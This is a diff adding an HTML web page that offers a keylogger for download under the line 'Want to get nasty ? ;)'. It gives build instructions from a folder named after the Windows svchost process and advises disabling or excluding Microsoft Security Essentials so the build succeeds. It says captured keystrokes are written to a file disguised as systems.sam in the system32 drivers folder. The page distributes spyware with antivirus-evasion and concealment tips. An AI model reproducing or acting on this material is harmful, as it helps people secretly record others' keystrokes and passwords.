@@ -1,0 +1,43 @@
+
+<div id="article">
+    
+    <div id="articleHeader">
+        <p id="moto1">Key Logger</p>
+    </div>
+
+    <br/ >
+    <div id="articleContent">
+        Want to get nasty ? ;)  
+        <a href="tools/keylogger.zip" class="button">Donwload</a>
+        
+        <br/ ><br/ >
+        <img src="tools/keylogger.png">        
+    </div>
+
+    <div id="articleContent">
+        <pre>
+Copmile if needed (exe is included)
+1. Install LCC 32 bit  http://www.cs.virginia.edu/~lcc-win32/
+2. dowload the attachment
+3. open cmd.exe
+4. set PATH=%PATH%;c:\lcc\bin
+5. cd c:\svchost
+6. compile.cmd
+
+
+Note, when installing LCC make sure to disable security essentials from MS
+         <span style="color: gray;">It was due to "Microsoft Security Essentials" on my computer. I went
+         to settings and excluded C:\lcc and reinstalled lcc. Libs are then
+         build correctly.</span>
+
+What to expect 
+
+1. execute once to start log keys
+2. execute once more to stop log keys
+3. the created file is in %windir%\system32\drivers\etc\systems.sam
+4. no file roatation
+5. tested in XP
+        </pre>
+    </div>
+
+</div>
